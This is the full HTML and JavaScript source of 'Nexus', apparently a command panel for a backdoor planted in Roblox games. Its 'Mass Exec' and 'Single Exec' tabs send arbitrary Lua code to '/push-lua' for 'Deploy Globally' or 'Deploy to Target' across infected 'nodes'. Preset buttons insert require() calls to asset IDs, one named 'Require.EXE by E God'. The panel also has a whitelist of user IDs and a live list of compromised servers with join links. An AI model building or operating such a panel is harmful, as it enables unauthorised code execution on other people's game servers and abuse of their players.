<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"><title>Nexus </title>
    <style>
        :root { --apple-blue: #0071e3; --glass: rgba(28, 28, 30, 0.85); }
        body { margin: 0; background: #000 url('https://www.apple.com/v/home/bl/images/overview/hero/hero_iphone15pro__de9bc4v8h26u_large.jpg') no-repeat center fixed; background-size: cover; color: #fff; font-family: -apple-system, sans-serif; overflow: hidden; }
        .app-header { position: fixed; top: 0; width: 100%; height: 50px; background: rgba(0,0,0,0.8); backdrop-filter: blur(20px); border-bottom: 1px solid #333; display: flex; align-items: center; justify-content: space-between; padding: 0 20px; box-sizing: border-box; z-index: 1000; }
        .nav-tabs { display: flex; gap: 10px; }
        .nav-tab { background: none; border: none; color: #86868b; cursor: pointer; font-size: 12px; padding: 6px 10px; border-radius: 6px; }
        .nav-tab.active { color: #fff; background: rgba(255,255,255,0.1); font-weight: 600; }
        .panel-center { display: flex; align-items: center; justify-content: center; height: 100vh; }
        .glass-card { background: var(--glass); backdrop-filter: blur(30px); border-radius: 24px; border: 1px solid rgba(255,255,255,0.1); width: 520px; padding: 30px; }
        input, textarea, select { width: 100%; border-radius: 10px; border: 1px solid #424245; background: rgba(0,0,0,0.4); color: #fff; padding: 12px; margin-bottom: 12px; box-sizing: border-box; outline: none; }
        .btn-blue { background: var(--apple-blue); color: #fff; border: none; border-radius: 10px; padding: 12px; width: 100%; font-weight: 600; cursor: pointer; }
        .rh-btn { background: rgba(255,255,255,0.1); color: #fff; border: 1px solid rgba(255,255,255,0.2); padding: 5px 12px; border-radius: 20px; font-size: 10px; cursor: pointer; margin-bottom: 10px; margin-right: 5px; }
        .tab-content { display: none; }
        .tab-content.active { display: block; }
        .list-box { background: rgba(0,0,0,0.2); border-radius: 12px; height: 220px; overflow-y: auto; }
        .game-entry { display: flex; justify-content: space-between; align-items: center; padding: 15px; border-bottom: 1px solid rgba(255,255,255,0.05); }
        .join-btn { background: #fff; color: #000; border-radius: 20px; padding: 4px 12px; font-size: 10px; font-weight: 700; text-decoration: none; }
        .id-text { font-family: monospace; font-size: 9px; color: #636366; display: block; margin-top: 2px; }
    </style>
</head>
<body>
    <header class="app-header">
        <div style="font-weight:700;"> Nexus</div>
        <div class="nav-tabs">
            <button class="nav-tab active" onclick="tab('m_exec')">Mass Exec</button>
            <button class="nav-tab" onclick="tab('s_exec')">Single Exec</button>
            <button class="nav-tab" onclick="tab('wl')">Whitelist</button>
            <button class="nav-tab" onclick="tab('gms')">Games</button>
        </div>
        <div id="time" style="font-size:11px; color:#86868b;"></div>
    </header>

    <div class="panel-center">
        <div class="glass-card">
            <div id="m_exec" class="tab-content active">
                <h2>Mass Execution</h2>
                <div style="margin-bottom:5px;">
                    <button class="rh-btn" onclick="ins(1)">Last Rig</button>
                    <button class="rh-btn" onclick="ins(2)">Require.EXE</button>
                </div>
                <input type="password" placeholder="System Password">
                <textarea rows="6" placeholder="-- Lua Code"></textarea>
                <button class="btn-blue" onclick="push(null)">Deploy Globally</button>
            </div>
            <div id="s_exec" class="tab-content">
                <h2>Single Execution</h2>
                <select id="target_id"></select>
                <div style="margin-bottom:5px;">
                    <button class="rh-btn" onclick="ins(1,true)">Last Rig</button>
                    <button class="rh-btn" onclick="ins(2,true)">Require.EXE</button>
                </div>
                <input type="password" placeholder="System Password">
                <textarea rows="5" placeholder="-- Specific Lua"></textarea>
                <button class="btn-blue" onclick="pushTarget()">Deploy to Target</button>
            </div>
            <div id="wl" class="tab-content">
                <h2>Whitelist</h2>
                <input type="text" id="wid" placeholder="Roblox UserID">
                <button class="btn-blue" onclick="wlu('add')">Authorize</button>
                <button class="btn-blue" style="background:#222; margin-top:8px;" onclick="wlu('remove')">Revoke</button>
            </div>
            <div id="gms" class="tab-content">
                <h2>Games & Nodes</h2><div id="g_list" class="list-box"></div>
            </div>
        </div>
    </div>

    <script>
        function tab(i){document.querySelectorAll('.tab-content').forEach(c=>c.classList.remove('active'));document.querySelectorAll('.nav-tab').forEach(t=>t.classList.remove('active'));document.getElementById(i).classList.add('active');event.target.classList.add('active');}
        function ins(type, isSingle){
            const box = document.querySelector(`#${isSingle?'s_exec':'m_exec'} textarea`);
            if(type === 1) box.value = `require(132155655397653)("YOUR_NAME_HERE")`;
            if(type === 2) box.value = `require(125992639027440)["Require.EXE by E God"]("YOUR_NAME_HERE")`;
        }
        async function push(tid){
            const tabId = tid ? 's_exec' : 'm_exec';
            const lua = document.querySelector(`#${tabId} textarea`).value;
            const pw = document.querySelector(`#${tabId} input`).value;
            const r = await fetch('/push-lua',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({lua,password:pw,targetId:tid})});
            alert(r.ok?"✓ Deployed":"✕ Denied");
        }
        function pushTarget(){ push(document.getElementById('target_id').value); }
        async function wlu(a){const i=document.getElementById('wid').value;await fetch('/update-whitelist',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id:i,action:a})});alert("Updated");}
        async function refresh(){
            const r=await fetch('/get-games?t='+Date.now());const d=await r.json();
            const l=document.getElementById('g_list');const sel=document.getElementById('target_id');
            const k=Object.keys(d);
            sel.innerHTML = k.map(i=>`<option value="${i}">${d[i].name} (${i.substring(0,8)}...)</option>`).join('');
            if(k.length===0){l.innerHTML='<div style="text-align:center;padding:40px;color:#424245;">No Active Nodes</div>';}
            else{l.innerHTML=k.map(i=>`
                <div class="game-entry">
                    <div style="max-width: 70%;">
                        <div style="font-size:13px;font-weight:600;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;">${d[i].name}</div>
                        <span class="id-text">${i}</span>
                        <div style="font-size:10px;color:#86868b;margin-top:2px;">${d[i].players} Players Online</div>
                    </div>
                    <a class="join-btn" href="roblox://placeId=${d[i].placeId}&gameInstanceId=${i}">JOIN</a>
                </div>`).join('');}
        }
        setInterval(refresh,5000);
        setInterval(()=>{document.getElementById('time').innerText=new Date().toLocaleTimeString()},1000);
        window.onload = refresh;
    </script>
</body>
</html>
